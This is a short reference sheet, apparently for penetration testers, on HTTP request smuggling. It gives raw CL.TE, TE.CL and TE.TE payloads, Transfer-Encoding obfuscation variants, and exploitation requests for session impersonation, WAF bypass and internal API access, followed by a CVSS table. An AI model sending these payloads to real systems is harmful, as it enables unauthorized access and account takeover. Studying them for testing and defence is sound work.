# HTTP Request Smuggling: Complete Reference

## Detection

### CL.TE (Content-Length vs Transfer-Encoding)
```bash
# Victim sees Content-Length, backend sees Transfer-Encoding
# Frontend reads CL=13, Backend reads TE, treats next request as smuggled

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Transfer-Encoding vs Content-Length)
```bash
# Frontend sees TE, backend sees CL
# Frontend treats next chars as part of same request

POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

58
GPOST / HTTP/1.1
...

0
```

### TE.TE (Transfer-Encoding obfuscation)
```bash
# Both frontend and backend support TE, but parse differently
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked\x0b
Transfer-Encoding: chunked\x0c
Transfer-Encoding: chunked\x20
Transfer-Encoding: chunked\x00
Transfer-Encoding: chunked,
Transfer-Encoding: chunked, identity
```

## Exploitation

### User Impersonation
```bash
# Smuggle a request that hijacks another user's session

POST / HTTP/1.1
Host: target.com
Content-Length: 62
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: target.com
Cookie: session=admin_session
```

### WAF Bypass
```bash
# Inject request directly to backend, bypassing WAF checks

POST / HTTP/1.1
Host: target.com
Content-Length: 29
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

### Internal Endpoint Access
```bash
# Access internal APIs exposed only to the backend

POST /public HTTP/1.1
Host: target.com
Content-Length: 55
Transfer-Encoding: chunked

0

GET /internal/admin/api/users HTTP/1.1
Host: internal-admin
```

## CVSS Scoring
| Scenario | CVSS | Criteria |
|----------|------|---------|
| Request smuggling -> WAF bypass | 8.6 | Network, Low, No auth, Changed scope |
| Request smuggling -> session hijack | 7.5 | Network, Low, No auth, Changed scope |
| Request smuggling -> cache poisoning | 6.1 | Network, Low, Network attack vector |
| Request smuggling -> internal access | 9.1 | Network, Low, No auth, Changed scope |